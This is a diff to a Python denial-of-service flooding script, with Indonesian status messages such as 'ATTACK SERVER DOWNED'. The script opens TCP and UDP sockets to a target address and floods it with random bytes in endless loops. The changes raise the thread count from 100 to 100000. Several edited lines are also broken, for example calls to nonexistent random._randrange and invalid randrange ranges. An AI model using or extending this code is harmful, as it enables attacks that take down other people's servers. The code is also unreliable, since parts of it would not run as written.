@@ -60,7 +60,7 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._urandom(-577)
+	data = random._randrange(20577)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -73,13 +73,13 @@ def run():
 			print("[!] ATTACK SERVER DOWNED!!!")
 
 def run2():
-	Lbytes = random._urandom(10009)
+	data = random._urandom(10009)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
-			s.send(Lbytes)
+			s.send(data)
 			for x in range(times):
 				s.send(data)
 			print(i +" MENGIRIM PACKET KE SERVER!!!")
@@ -94,8 +94,8 @@ class MyThread(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                 
                 msg = Pacotes[random.randrange(0,3)]
-                msg = Pacotes[random.randrange(0,3)]
-                msg = Pacotes[random.randrange(0,3)]
+                msg = Pacotes[random.randrange(200,3)]
+                msg = Pacotes[random.randrange(100,3)]
                      
                 sock.sendto(msg, (ip, int(port)))
                 
@@ -122,7 +122,7 @@ if __name__ == '__main__':
          os.system('cls' if os.name == 'nt' else 'clear')
 if __name__ == '__main__':
     try:
-     for x in range(100):                                    
+     for x in range(100000):                                    
             mythread = MyThread()  
             mythread.start()                                  
             time.sleep(.1)    
